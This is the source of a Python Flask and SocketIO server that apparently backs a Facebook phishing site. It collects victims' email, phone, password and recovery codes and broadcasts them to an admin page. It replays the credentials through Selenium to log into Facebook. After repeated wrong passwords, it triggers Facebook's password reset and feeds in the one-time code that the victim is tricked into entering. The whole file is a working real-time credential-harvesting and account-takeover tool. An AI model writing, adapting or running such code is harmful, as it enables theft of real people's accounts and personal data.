from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

app = Flask(__name__)
socketio = SocketIO(app)
driver = None

# Dictionary to track login attempts
login_attempts = {}
code_attempts = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/confirm')
def confirm_page():
    return render_template('confirm.html')
@app.route('/done')
def done_page():
    return render_template('done.html')
@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')
    emit('message', {'data': f'Connected to the server with ID: {request.sid}'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f'Client disconnected: {request.sid}')
    if request.sid in login_attempts:
        del login_attempts[request.sid]

@socketio.on('client_contact')
def handle_client_contact(data):
    email = data['email']
    phone = data['phone']
    print(f'Received email from client {request.sid}: {email}')
    print(f'Received phone from client {request.sid}: {phone}')
    emit('admin_message', {'id': request.sid, 'type': 'email', 'data': email}, broadcast=True)
    emit('admin_message', {'id': request.sid, 'type': 'phone', 'data': phone}, broadcast=True)

@socketio.on('client_password')
def handle_client_password(data):
    global driver
    contact = data['contact']
    email = contact['email']
    phone = contact['phone']
    password = data['data']
    print(f'Received password from client {request.sid}: {password}')
    emit('admin_message', {'id': request.sid, 'type': 'password', 'data': password}, broadcast=True)
    
    # Perform login test with the received contact and password
    result = login_facebook(email, phone, password)
    
    # Track login attempts
    if request.sid not in login_attempts:
        login_attempts[request.sid] = 0
    if result == "Wrong_Pass":
        login_attempts[request.sid] += 1
        if login_attempts[request.sid] > 2:
            forgot_password(email,phone)
            emit('redirect', {'url': '/confirm'}, room=request.sid)
            return
    
    # Emit the result back to the client
    emit('login_result', {'result': result}, room=request.sid)

def setup_selenium():
    global driver
    if driver is None:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service)
        driver.get("https://www.facebook.com/")
    return driver

def login_facebook(email, phone, password):
    global driver
    try:
        driver = setup_selenium()
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "email")))
        
        contact = email if email else phone
        email_input = driver.find_element(By.ID, "email")
        email_input.clear()
        email_input.send_keys(contact)
        
        password_input = driver.find_element(By.ID, "pass")
        password_input.clear()
        password_input.send_keys(password)
        
        login_button = driver.find_element(By.NAME, "login")
        login_button.click()
        
        time.sleep(5)
        
        if "two_step_verification" in driver.current_url:
            print("Two-step verification required.")
            return "checkpoint"
        elif "https://www.facebook.com/login" in driver.current_url:
            # If login with email fails, try logging in with phone
            email_input = driver.find_element(By.ID, "email")
            email_input.clear()
            email_input.send_keys(phone)
            
            password_input = driver.find_element(By.ID, "pass")
            password_input.clear()
            password_input.send_keys(password)
            
            login_button = driver.find_element(By.NAME, "login")
            login_button.click()
            
            time.sleep(5)
            
            if "two_step_verification" in driver.current_url:
                print("Two-step verification required.")
                return "checkpoint"
            elif "https://www.facebook.com/login" in driver.current_url:
                print("Login failed. Please check your credentials.")
                return "Wrong_Pass"
        elif "https://www.facebook.com/recover" in driver.current_url:
            forgot_password(email,phone)
            emit('redirect', {'url': '/confirm'}, room=request.sid)

        print("Login successful.")
        return "Login_Success"
    except Exception as e:
        print(f"An error occurred: {e}")
        return str(e)


def forgot_password(email, mobile=None):
    global driver
    try:
        driver.get("https://www.facebook.com/login/identify")
 
        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, "identify_email")))
        
        # Lấy phần tử input bằng ID
        email_input = driver.find_element(By.ID, "identify_email")
        email_input.clear()
        email_input.send_keys(email)
        
        # Nhấn nút tìm kiếm (tương tự như trước)
        search_button = driver.find_element(By.NAME, "did_submit")
        search_button.click()
        time.sleep(5)
        driver.get("https://www.facebook.com/recover/initiate/?is_from_lara_screen=1")
        
        button = WebDriverWait(driver, 20).until(
            EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
        )
        button.click()
        # đã lấy được form input và button submit
        
        print("Recovery code request initiated.")

    except Exception as e:
        print(f"An error occurred during forgot password process: {e}")


@socketio.on('confirm_code')
def handle_confirm_code(data):
    code = data['code']
    print(f'Received confirmation code from client {request.sid}: {code}')
    
    # Track confirmation code attempts
    if request.sid not in code_attempts:
        code_attempts[request.sid] = 0
    code_attempts[request.sid] += 1
    print(code_attempts[request.sid])
    if code_attempts[request.sid] > 2:
        emit('redirect', {'url': '/done'}, room=request.sid)
        return
    
    result = enter_confirmation_code(code)
    print(result)
    if result != "Code_Accepted":
        code_attempts[request.sid] += 1
        if code_attempts[request.sid] >= 2:
            emit('redirect', {'url': '/done'}, room=request.sid)
            return


def enter_confirmation_code(code):
    global driver
    try:
        code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "recovery_code_entry"))
        )
        code_input.clear()
        code_input.send_keys(code)
        
        continue_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
        )
        continue_button.click()
        time.sleep(5)

        if "https://www.facebook.com/recover/code" in driver.current_url:
            print("Invalid confirmation code. Please try again.")
            return "Invalid_Code"


        print("Confirmation code entered.")
    except Exception as e:
        print(f"An error occurred while entering the confirmation code: {e}")


if __name__ == '__main__':
    socketio.run(app, debug=True)